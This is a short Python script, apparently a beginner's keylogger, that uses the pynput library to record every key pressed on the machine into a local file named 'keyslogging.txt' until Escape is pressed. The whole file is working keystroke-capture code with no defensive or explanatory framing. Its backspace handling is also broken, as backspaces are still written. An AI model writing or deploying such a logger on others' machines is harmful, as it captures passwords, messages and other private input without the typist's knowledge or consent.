from pynput.keyboard import Key, Listener 





def on_press(key):

	write_1(key)





def write_1(var):

	with open("keyslogging.txt","r+") as f:



		if var == Key.backspace:

			pass



		if var == Key.space:

			new_var = str(var).replace(str(Key.space)," ")

			f.write(new_var)



		else:

			new_var = str(var).replace("'",'')

			f.write(new_var)

		f.write(" ")





def on_release(key):

	if key == Key.esc:

		return False



with Listener(on_press=on_press, on_release=on_release) as l:

	l.join()

